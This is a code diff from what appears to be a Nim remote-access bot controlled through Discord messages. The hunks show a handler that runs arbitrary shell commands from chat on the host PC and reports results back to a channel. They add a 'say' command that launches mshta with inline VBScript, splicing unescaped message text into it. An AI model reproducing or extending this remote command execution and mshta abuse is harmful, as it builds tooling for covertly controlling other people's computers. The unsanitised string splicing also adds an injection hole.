@@ -57,6 +57,7 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
         elif m.content.startsWith(alias):
           command = m.content.split(alias & " ")[1]
 
+
         if (command.startsWith("shutdown")):
           try:
             let msg: string = command.split("shutdown ")[1]
@@ -87,6 +88,20 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
           discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "running cmd")
 
           let errCode = execShellCmd(cmd)
+
+          discard await discord.api.sendMessage(
+            CHANNEL,
+            THISPCSTR & "ran with err code: " & $errCode
+          )
+        elif (command.startsWith("say")):
+          let text: string = command.split("say ")[1]
+
+          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "saying...")
+
+          let errCode = execShellCmd(
+            """mshta vbscript:Execute("CreateObject(""SAPI.SpVoice"").Speak(""""" &
+            text & """"")(window.close)")"""
+          )
 
           discard await discord.api.sendMessage(
             CHANNEL,
